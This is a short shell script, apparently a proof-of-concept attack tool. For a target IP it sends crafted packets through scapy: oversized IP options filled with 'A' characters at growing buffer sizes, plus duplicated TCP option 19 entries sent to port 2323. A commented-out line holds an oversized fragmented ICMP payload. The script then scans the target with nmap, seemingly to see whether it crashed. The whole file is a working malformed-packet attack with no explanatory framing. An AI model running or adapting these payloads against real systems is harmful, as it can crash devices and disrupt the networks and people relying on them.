#!/bin/sh

if [ ! -z $1 ]
then
    IP="$1"
    for BUFFER in 8 10 12 14 16 18 20 32 64 128
    do
        PAYLOAD="send(IP(dst=\"${IP}\",options=[IPOption(\"A\"*${BUFFER})])/TCP(dport=2323,options=[(19, \"1\"*18),(19, \"2\"*18)]))"
        # PAYLOAD2="send(fragment(IP(dst=\"${IP}\")/ICMP()/(\"X\"*60000)))"
        PAYLOAD_B64=$(echo -e "${PAYLOAD}" | base64 -w 0)

        echo "[*] Sending payload ..."
        echo "        [IP] ${IP}"
        echo "    [BUFFER] ${BUFFER}"
        echo "   [PAYLOAD] ${PAYLOAD_B64}"
        echo ""

        sudo su -c "echo \"${PAYLOAD_B64}\n\" | base64 -d | scapy"
     done
     sudo nmap -Pn --top-ports 100 -d ${IP}
else
    echo "Usage: $0 <IP>"
fi
